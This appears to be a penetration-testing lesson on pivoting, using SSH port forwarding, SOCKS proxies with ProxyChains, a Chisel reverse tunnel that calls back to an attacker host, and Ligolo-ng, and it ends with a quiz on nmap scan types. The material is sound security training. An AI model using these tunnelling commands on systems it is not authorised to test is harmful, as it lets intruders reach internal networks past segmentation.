
# Pivoting & Tunneling (SOCKS Proxies)

## Reaching the Unreachable
Real networks are segmented. You might compromise a Web Server in the DMZ (192.168.1.10), but the Database is deeper in the internal network (10.10.10.50). You cannot route to 10.10.10.x directly.

**Pivoting** is using the compromised machine as a bridge (router) to attack the internal network.

## 1. The Concept
<Mermaid chart={`
graph LR
    Attacker[Attacker Machine<br>1.2.3.4] <-->|Public Internet| JumpBox[Compromised Web Server<br>Dual NIC]
    JumpBox <-->|Private Network| Target[Hidden Database<br>10.10.10.50]
    
    style Attacker fill:#b91c1c,stroke:#fff,stroke-width:2px,color:#fff
    style JumpBox fill:#f59e0b,stroke:#fff,stroke-width:2px,color:#000
    style Target fill:#22c55e,stroke:#fff,stroke-width:2px,color:#000
`} />

## 2. SSH Port Forwarding
If the compromised host runs SSH, we can use it to tunnel traffic.

### Local Port Forwarding (-L)
"I want to access PORT 3306 on the Target, by connecting to PORT 1234 on my machine."
`ssh -L 1234:10.10.10.50:3306 user@jumpbox`
-   **Result:** `mysql -h 127.0.0.1 -P 1234` -> connects to Target DB.

### Dynamic Port Forwarding (-D) [The SOCKS Proxy]
"I want to access the *entire* 10.10.10.x network."
`ssh -D 9050 user@jumpbox`
-   This creates a **SOCKS4/5 Proxy** on `localhost:9050`.
-   Configure **ProxyChains** (`/etc/proxychains.conf`) to point to 127.0.0.1:9050.
-   **Run:** `proxychains nmap -sT -Pn 10.10.10.50`

## 3. Chisel (The Modern Standard)
SSH isn't always available (especially on Windows). **Chisel** is a standalone binary that creates a fast TCP tunnel over HTTP/WebSockets.

### Step 1: Server (Attacker)
Run Chisel in "Reverse" mode.
`./chisel server -p 8000 --reverse`

### Step 2: Client (Compromised Host)
Connect back to attacker.
`./chisel client 1.2.3.4:8000 R:socks`

### Step 3: Profit
A SOCKS proxy opens on your machine (default port 1080). Use ProxyChains.

<CodeBlock language="text" showLineNumbers code={`# /etc/proxychains.conf
dynamic_chain
#strict_chain
proxy_dns 
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5  127.0.0.1 1080
`} />

## 4. Lateral Movement with Ligolo-ng
Ligolo-ng allows you to create a `tun` interface on your attacker machine, so you can route traffic natively without Proxychains (e.g., `ping 10.10.10.50` actually works).
This is advanced but superior for stability.

---

<Quiz 
    question="You have set up a Dynamic Port Forward (SOCKS Proxy) via SSH on port 9050. You run `nmap -sS -p80 10.10.10.5` through ProxyChains, but it fails. Why?" 
    options={[
        "Nmap -sS (Stealth Scan) uses raw TCP/IP packets which SOCKS proxies cannot handle. You must use -sT (Connect Scan).",
        "The proxy port is wrong.",
        "The target is down.",
        "You need to use -sU for UDP scanning."
    ]} 
    answer="Nmap -sS (Stealth Scan) uses raw TCP/IP packets which SOCKS proxies cannot handle. You must use -sT (Connect Scan)." 
/>
